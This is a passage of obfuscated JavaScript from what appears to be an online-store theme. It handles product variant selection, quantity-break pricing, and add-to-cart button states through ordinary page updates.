        _0x4d6ff9.innerHTML = _0x395af1.innerHTML;
      }
      if (_0x188305 && _0x348195) {
        _0x188305.innerHTML = _0x348195.innerHTML;
      }
      if (_0x4ade24 && _0x2f3f05) {
        _0x4ade24.src = _0x2f3f05.src;
      }
      if (_0x34199b && _0x3c6372) {
        _0x3c6372.innerHTML = _0x34199b.innerHTML;
      }
      if (_0x13b3c4 && _0x6e59f) {
        for (var _0x3307cb = 0x0; _0x3307cb < _0x13b3c4.length; _0x3307cb++) {
          _0x13b3c4[_0x3307cb].innerHTML = _0x6e59f[_0x3307cb].innerHTML;
        }
      }
      if (_0x2bb89e && _0x5484f5) {
        _0x5484f5.innerHTML = _0x2bb89e.innerHTML;
      }
      if (_0x2617f0 && _0x4e3041) {
        _0x4e3041.innerHTML = _0x2617f0.innerHTML;
        _0x4e3041.classList.toggle('visibility-hidden', _0x2617f0.classList.contains('visibility-hidden'));
      }
      if (this.QuantityBreaks) {
        const _0x38007f = _0x52bad7.getElementById('quantity-breaks-' + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
        const _0x2c8dcf = this.QuantityBreaks.querySelectorAll(".dynamic-price");
        const _0x25b699 = _0x38007f.querySelectorAll('.dynamic-price');
        for (let _0x39c7ea = 0x0; _0x39c7ea < _0x2c8dcf.length; _0x39c7ea++) {
          _0x2c8dcf[_0x39c7ea].innerHTML = _0x25b699[_0x39c7ea].innerHTML;
        }
        if (this.QuantityBreaks.hasVariants) {
          this.QuantityBreaks.variantSelects.forEach(_0x27461d => {
            _0x27461d.dataset.selectedId = this.currentVariant.id;
          });
          const _0x144553 = this.QuantityBreaks.querySelectorAll(".quantity-break__variant-select");
          const _0x22903b = _0x38007f.querySelectorAll(".quantity-break__variant-select");
          for (let _0x289da4 = 0x0; _0x289da4 < _0x144553.length; _0x289da4++) {
            _0x144553[_0x289da4].innerHTML = _0x22903b[_0x289da4].innerHTML;
          }
          this.QuantityBreaks.initVariants();
        }
        ;
      }
      if (this.hasQuantityBreaksPicker) {
        const _0x15afb1 = _0x52bad7.getElementById("variant-selects-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
        const _0x307993 = this.querySelectorAll(".dynamic-price");
        const _0x4a41b2 = _0x15afb1.querySelectorAll('.dynamic-price');
        for (let _0x3f04e1 = 0x0; _0x3f04e1 < _0x307993.length; _0x3f04e1++) {
          _0x307993[_0x3f04e1].innerHTML = _0x4a41b2[_0x3f04e1].innerHTML;
        }
        if (this.quantityBreaksPickerStyle === "vertical" && this.quantityBreaksPickerDisplayedImages === "variant_images") {
          const _0x43f546 = this.querySelectorAll(".quantity-break__image img");
          const _0x3740a2 = _0x15afb1.querySelectorAll(".quantity-break__image img");
          for (let _0x4c5316 = 0x0; _0x4c5316 < _0x43f546.length; _0x4c5316++) {
            _0x43f546[_0x4c5316].src = _0x3740a2[_0x4c5316].src;
          }
        }
      }
      if (this.secondarySelect) {
        const _0x218435 = _0x52bad7.getElementById('' + this.secondarySelectSelector + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
        if (_0x218435) {
          this.secondarySelect.innerHTML = _0x218435.innerHTML;
        }
      }
      const _0xcc9bc0 = document.getElementById('price-' + this.dataset.section);
      if (_0xcc9bc0) {
        _0xcc9bc0.classList.remove('visibility-hidden');
      }
      if (_0x5484f5) {
        _0x5484f5.classList.toggle('visibility-hidden', _0x2bb89e.innerText === '');
      }
      const _0x1182f9 = _0x52bad7.getElementById("ProductSubmitButton-" + _0x1b86aa);
      this.toggleAddButton(_0x1182f9 ? _0x1182f9.hasAttribute("disabled") : true, window.variantStrings.soldOut);
      publish("variant-change", {
        'data': {
          'sectionId': _0x1b86aa,
          'html': _0x52bad7,
          'variant': this.currentVariant
        }
      });
    });
  }
  ["toggleAddButton"](_0x11198d = true, _0x414d2b, _0x2f91bd = true) {
    const _0x4a9dca = document.getElementById("product-form-" + this.dataset.section);
    if (!_0x4a9dca) {
      return;
    }
    const _0xedd514 = _0x4a9dca.querySelector("[name=\"add\"]");
    const _0x472bba = _0x4a9dca.querySelector("[name=\"add\"] > .main-atc__label");
    if (!_0xedd514) {
      return;
    }
    if (_0x11198d) {
      _0xedd514.setAttribute('disabled', 'disabled');
      _0xedd514.setAttribute('data-unavailable', "true");
      if (_0x414d2b) {
        _0x472bba.textContent = _0x414d2b;
      }
    } else {
      _0xedd514.setAttribute("data-unavailable", "false");
      _0x472bba.textContent = window.variantStrings.addToCart;
      if (_0xedd514.dataset.requiredFields === _0xedd514.dataset.validFields) {
        _0xedd514.removeAttribute('disabled');
      }
    }
    if (!_0x2f91bd) {
      return;
    }
  }
  ["setUnavailable"]() {
    const _0xef12de = document.getElementById("product-form-" + this.dataset.section);
    const _0x3810ab = _0xef12de.querySelector("[name=\"add\"]");
    const _0x1785a9 = _0xef12de.querySelector("[name=\"add\"] > .main-atc__label");
    const _0x240853 = document.getElementById("price-" + this.dataset.section);
    const _0x4d938f = document.getElementById("Inventory-" + this.dataset.section);
    const _0x2aea9b = document.getElementById("Sku-" + this.dataset.section);
    if (!_0x3810ab) {
      return;
    }
    _0x1785a9.textContent = window.variantStrings.unavailable;
    if (_0x240853) {
      _0x240853.classList.add("visibility-hidden");
    }
    if (_0x4d938f) {
      _0x4d938f.classList.add("visibility-hidden");
    }
    if (_0x2aea9b) {
      _0x2aea9b.classList.add("visibility-hidden");
    }
  }
  ['getVariantData']() {
    this.variantData = this.variantData || JSON.parse(this.querySelector("[type=\"application/json\"]").textContent);
    return this.variantData;
  }
}
customElements.define("variant-selects", VariantSelects);
class SecondaryVariantSelect extends VariantSelects {
  constructor() {
    super();
    this.secondarySelectSelector = "variant-selects-";
    this.secondarySelect = document.getElementById('' + this.secondarySelectSelector + this.dataset.section);
    this.isSecondary = true;
  }
  ['updateOptions']() {
    this.options = this.querySelector("select").value.split(',');
  }
}
customElements.define("secondary-variant-select", SecondaryVariantSelect);
class SecondaryVariantSelectSeparate extends VariantSelects {
  constructor() {
    super();
    this.secondarySelectSelector = "variant-selects-";
    this.secondarySelect = document.getElementById('' + this.secondarySelectSelector + this.dataset.section);
    this.isSecondary = true;
  }
}
customElements.define("secondary-variant-select-separate", SecondaryVariantSelectSeparate);
